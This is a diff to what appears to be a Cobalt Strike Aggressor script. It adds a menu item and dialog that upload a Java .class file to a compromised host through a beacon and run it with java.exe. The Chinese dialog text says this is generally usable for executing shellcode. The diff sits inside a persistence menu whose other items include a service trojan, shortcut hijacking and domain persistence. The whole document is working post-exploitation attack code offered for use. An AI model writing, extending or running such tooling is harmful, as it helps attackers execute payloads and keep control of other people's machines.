@@ -271,6 +271,28 @@ sub userAccountControlidconfig{
 	dialog_show($dialog);
 }
 
+sub javarun {
+	foreach $id ($bid){
+		$path = $3["path"]. "\\". "java.exe";
+		$classpath = $3["classpath"];
+		$filename = split("\\\\", $classpath)[-1];
+		$classname = replace($filename, ".class", "");
+		bupload($id, $classpath);
+		bshell($id, "\"$path\" $classname");
+		println("$id $path $classname");
+		
+	}
+}
+
+sub javarunconfig{
+	$dialog = dialog("java运行class文件(一般可用于执行shellcode)", %(bid => $bid, path => "", classpath => "", remote => "C:\\Users\\Public"), &javarun);
+	drow_text($dialog, "path", "JDKPATH:");
+	drow_file($dialog, "classpath", "classfilePATH:");
+	drow_text($dialog, "remote", "RemoteUploadPath:");
+	dbutton_action($dialog, "Run");
+	dialog_show($dialog);
+}
+
 popup beacon_bottom{
 	menu "&权限维持"{
 		item "&cs服务马"{
@@ -311,6 +333,10 @@ popup beacon_bottom{
 		
 		item "&lnk劫持快捷键" {
 			lnkreateconfig($bid);
+		}
+		
+		item "&java执行class" {
+			javarunconfig($bid);
 		}
 		
 		menu "&域权限维持" {
